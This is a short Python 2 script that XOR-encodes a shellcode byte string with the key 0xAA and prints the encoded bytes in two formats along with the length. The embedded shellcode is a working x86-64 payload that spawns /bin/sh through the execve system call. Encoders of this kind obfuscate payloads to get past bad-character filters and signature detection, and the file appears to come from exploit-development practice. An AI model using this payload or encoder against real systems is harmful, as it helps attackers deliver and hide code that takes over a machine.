#!/bin/python


# Place your shellcode into 'shellcode' variable and the output will return the XOR encoded 
# shellcode with 0xAA as encoding byte.


shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05")

str1 = ""
str2 = ""


for i in bytearray(shellcode):
	#print "%x" %i	
	encoded = i ^ 0xAA
	str1 += "\\x%x" % encoded
	str2 += "0x%x," % encoded


print "\n" + str1 + "\n"
print str2 + "\n"
	
print "Length of shellcode : %d" % len(shellcode)
